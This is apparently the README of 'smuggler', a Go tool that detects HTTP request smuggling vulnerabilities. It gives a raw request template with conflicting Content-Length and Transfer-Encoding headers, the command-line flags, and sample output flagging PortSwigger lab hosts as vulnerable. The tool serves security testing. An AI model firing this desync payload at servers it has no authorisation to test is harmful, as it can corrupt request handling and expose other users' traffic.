# smuggler
A tool for detecting HTTP request smuggling vulnerabilities  
net/http makes it very challenging to send a request with malformed or duplicate headers. So for this application, it is more practical to parse a template and write it to a socket. This makes it easy to add your own payloads and may be useful for other things than request smuggling for ease of creating templates by copy/pasting from Burp.



Templates:
```
POST {{.Path}} HTTP/1.1
Host: {{.Host}}
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

```

Usage:
```
$ ./smuggler -h
Usage of ./smuggler:
  -proxy string
    	Set the Golang proxy, for example: http://example.com:8080
  -u string
    	Target URL
  -urls string
    	List of URLs

```

Example test on Portswigger labs:
```
$ ./smuggler -urls targets.test 
https://ac291f541e8bb695c0338e2700cd00fb.web-security-academy.net/ is vulnerable
https://ac761f071e92b6b8c0448fee001c0096.web-security-academy.net/ is vulnerable
https://acb71f6e1f079d25c08104be00290033.web-security-academy.net/ is vulnerable
```
